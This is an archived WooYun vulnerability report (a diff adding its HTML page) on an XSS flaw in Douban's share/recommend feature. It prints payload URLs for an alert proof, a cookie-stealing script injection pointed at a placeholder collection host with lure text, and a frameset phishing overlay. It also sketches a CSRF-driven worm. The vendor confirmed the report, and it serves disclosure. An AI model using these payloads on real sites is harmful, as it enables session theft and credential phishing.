@@ -1,0 +1,200 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		豆瓣某功能设计缺陷导致可钓密码及xss攻击  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		豆瓣某功能设计缺陷导致可钓密码及xss攻击  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/华莱士">华莱士</a> 
+</li><li>提交时间：		2014-04-12 13:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-04-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-04-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-04-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-05-02：	细节向普通白帽子公开<br/>
+									2014-05-12：	细节向实习白帽子公开<br/>
+									2014-05-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">苏菲弹力防简介侧漏</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1:像豆瓣广播这种关键位置应该早就被里里外外挖了个遍,不过还是遇到一个遗漏点,在&quot;推荐&quot;到豆瓣广播这一功能中,desc参数为空时则href参数能够造成xss攻击,由于触发容易且位置显眼很容易引发大范围蠕虫<br />
+<br />
+<br />
+<br />
+示例1<br />
+<br />
+http://www.douban.com/share/recommend?sanity_key=_da6c6&amp;apikey=&amp;name=&amp;image=http://img3.douban.com/view/status/median/public/d20a54a640f40eb.jpg&amp;redir=&amp;btn_text=%E6%8E%A8%E8%8D%90&amp;href=javascript:alert(&#039;heheworld&#039;)&amp;type=&amp;properties={}&amp;desc=<br />
+<br />
+</p><p class="detail"><a href="../images/12130212b004241f1251c6340714f184df6b1087.jpg" target="_blank"><img src="../images/12130212b004241f1251c6340714f184df6b1087.jpg" alt="0.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+之后假设这样的情况,当这处参数被嵌入恶意代码并进行一番&quot;易容&quot;诱惑受害者去点击,例如这里我通过检索找了个公众热度较高的豆瓣红人,通过推荐她的发言,文章,等内容后修改特定参数,借此人名义可去迷惑受害者,无论是点击图片还是描述都会立即触发,测试中无视谷歌浏览器的filter,即便会有警惕的人将其识破,但对用户基数庞大的sns社区来说,这种比例又是多少,一旦被人用来进行csrf,让查看这则动态的受害者自动发送携恶意代码的广播又会造成什么后果<br />
+<br />
+示例2:http://www.douban.com/share/recommend?sanity_key=_da6c6&amp;apikey=&amp;name=浮力森林的相册&amp;image=http://img3.douban.com/view/status/median/public/d20a54a640f40eb.jpg&amp;redir=&amp;btn_text=%E6%8E%A8%E8%8D%90&amp;href=javascript:&#039;胸太大也会有很多烦恼的,穿什么都显胖,我觉得女生脚好看也是很性感的,诸如此类写一些吸引性的标题,点击文字或图片即触发,多凑些字把后面的代码挤走就&#039;,x=document.createElement(&#039;script&#039;);x.setAttribute(&#039;src&#039;, &#039;xss收信地址&#039;);document.documentElement.appendChild(x)&amp;type=&amp;properties={}&amp;desc=<br />
+<br />
+</p><p class="detail"><a href="../images/12131813f9226242209994c27c94d3e5b9f77032.jpg" target="_blank"><img src="../images/12131813f9226242209994c27c94d3e5b9f77032.jpg" alt="111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+经测试代码中的;号会截断xss语句,所以得用eval处理下,或是用不带分号的写法,此处仅证明可以触发xss成功获取cookie<br />
+<br />
+</p><p class="detail"><a href="../images/12132043a37282a27010728fa9796043a87ba416.jpg" target="_blank"><img src="../images/12132043a37282a27010728fa9796043a87ba416.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2:如果这个xss被用来实施钓鱼呢?目前有不少比较猥琐的钓鱼页面都是直接另存原页面的源码,在其基础上稍加修改而来的,再以个什么借口让用户重新登陆,那么如果利用xss将这样的钓鱼内容在原页面上输出,就可以进一步做到url欺骗的效果<br />
+<br />
+示例3:http://www.douban.com/share/recommend?sanity_key=_da6c6&amp;apikey=&amp;name=&amp;image=http://img3.douban.com/view/status/median/public/d20a54a640f40eb.jpg&amp;redir=&amp;btn_text=%E6%8E%A8%E8%8D%90&amp;href=javascript:document.write(&quot;&lt;frameset cols=\&quot;0,*\&quot; frameborder=\&quot;NO\&quot; border=\&quot;0\&quot; framespacing=\&quot;0\&quot;&gt;&lt;frame src=\&quot;/null.htm\&quot; scrolling=\&quot;NO\&quot; noresize&gt;&lt;frame src=\&quot;http://www.zhihu.com/\&quot;&gt;&lt;/frameset&gt;&quot;)&amp;type=&amp;properties={}&amp;desc=<br />
+<br />
+</p><p class="detail"><a href="../images/121318564de1812c2ba0735fe11d18a10c8e5b4f.jpg" target="_blank"><img src="../images/121318564de1812c2ba0735fe11d18a10c8e5b4f.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这里加载了知乎的页面却仍保留了豆瓣的url,能够是知乎也当然可以是上面提到的那种页面,外貌上完全一致加上url毫无破绽,没有个血轮眼很难识破,而且在Chrome下查看源码时也也仅会显示原豆瓣的源码,如果这样的攻击在结束后跳转到真实的地址,基本上就能不留痕迹的完成钓鱼过程,一旦配合csrf进行大范围蠕虫后果可想而知<br />
+<br />
+<br />
+<br />
+另外想问下集齐多少颗豆瓣的洞能够召唤礼物 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1213210294e31eb2790a851b9b55e03fd9367265.jpg" target="_blank"><img src="../images/1213210294e31eb2790a851b9b55e03fd9367265.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们专业 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/华莱士" title="华莱士">华莱士</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-056801" title="豆瓣某功能设计缺陷导致可钓密码及xss攻击">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2014-04-12 20:32</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢反馈，立即组织修复~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="56801";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
